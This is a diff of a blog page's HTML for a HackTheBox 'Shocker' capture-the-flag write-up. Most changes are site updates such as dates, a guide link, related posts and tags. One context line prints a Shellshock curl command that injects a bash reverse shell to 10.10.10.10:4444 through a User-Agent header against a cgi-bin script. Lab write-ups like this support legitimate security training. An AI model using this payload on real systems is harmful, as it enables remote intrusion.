@@ -47,7 +47,7 @@
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@S4nity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-04-20T12:11:57+02:00","datePublished":"2025-04-19T13:00:00+02:00","description":"Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.","headline":"HackTheBox - Shocker","image":"https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanity-archive.github.io/posts/Hack-The-Box-Shocker/"},"url":"https://sanity-archive.github.io/posts/Hack-The-Box-Shocker/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-04-19T13:00:00+02:00","datePublished":"2025-04-19T13:00:00+02:00","description":"Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.","headline":"HackTheBox - Shocker","image":"https://labs.hackthebox.com/storage/avatars/efef52a0fb63d9c8db0ab6e50cb6ac79.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanity-archive.github.io/posts/Hack-The-Box-Shocker/"},"url":"https://sanity-archive.github.io/posts/Hack-The-Box-Shocker/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -848,29 +848,6 @@
 
       <!-- lastmod date -->
       
-        <span>
-          Updated
-          <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1745143917"
-  data-df="ll"
-  
-    data-bs-toggle="tooltip" data-bs-placement="bottom"
-  
->
-  Apr 20, 2025
-</time>
-
-        </span>
-      
 
       
         
@@ -1078,7 +1055,7 @@ First, we run a small command to see if it works:</p>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; echo; echo; /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1'"</span> http://10.129.15.122/cgi-bin/user.sh
 </pre></td></tr></tbody></table></code></div></div>
-<p>After gaining a shell, we upgrade it to an interactive one. To see how it’s done, check out my guide <a href="">here</a>.</p>
+<p>After gaining a shell, we upgrade it to an interactive one. To see how it’s done, check out my guide <a href="/posts/Interactive-Shell-Guide">here</a>.</p>
 
 <h2 id="escalating-our-privileges"><span class="me-2">Escalating our privileges</span><a href="#escalating-our-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 <h3 id="method-1-sudo-perl-shell"><span class="me-2">Method 1: Sudo Perl Shell</span><a href="#method-1-sudo-perl-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
@@ -1328,6 +1305,13 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         
         
         <li class="text-truncate lh-lg">
+          <a href="/posts/Interactive-Shell-Guide/">Guide&#58; Interactive Shells</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
           <a href="/posts/Hack-The-Box-Shocker/">HackTheBox - Shocker</a>
         </li>
       
@@ -1430,6 +1414,138 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         
         
 
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
 
 
   <section>
@@ -1440,10 +1556,19 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         <a class="post-tag btn btn-outline-primary" href="/tags/cgi/">cgi</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/guide/">guide</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/linux/">linux</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/priv-esc/">priv-esc</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/quick-guide/">quick-guide</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/reverse-shell/">reverse-shell</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/web-attacks/">web-attacks</a>
@@ -1507,6 +1632,17 @@ lxc <span class="nb">exec </span>r00t /bin/sh
 
   
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
 
@@ -1516,6 +1652,43 @@ lxc <span class="nb">exec </span>r00t /bin/sh
 
 
 
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/Interactive-Shell-Guide/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1745146800"
+  data-df="ll"
+  
+>
+  Apr 20, 2025
+</time>
+
+              <h4 class="pt-0 my-2">Guide&#58; Interactive Shells</h4>
+              <div class="text-muted">
+                <p>This guide explains what an interactive shell is and how you can get it running.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
 
 
             
@@ -1533,9 +1706,13 @@ lxc <span class="nb">exec </span>r00t /bin/sh
   
 
   
-    <div class="btn btn-outline-primary disabled" aria-label="Newer">
-      <p>-</p>
-    </div>
+    <a
+      href="/posts/Interactive-Shell-Guide/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Guide&#58; Interactive Shells</p>
+    </a>
   
 </nav>
 
@@ -1679,6 +1856,138 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         
         
 
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
 
 
   <section>
@@ -1689,10 +1998,19 @@ lxc <span class="nb">exec </span>r00t /bin/sh
         <a class="post-tag btn btn-outline-primary" href="/tags/cgi/">cgi</a>
       
         
+        <a class="post-tag btn btn-outline-primary" href="/tags/guide/">guide</a>
+      
+        
         <a class="post-tag btn btn-outline-primary" href="/tags/linux/">linux</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/priv-esc/">priv-esc</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/quick-guide/">quick-guide</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/reverse-shell/">reverse-shell</a>
       
         
         <a class="post-tag btn btn-outline-primary" href="/tags/web-attacks/">web-attacks</a>
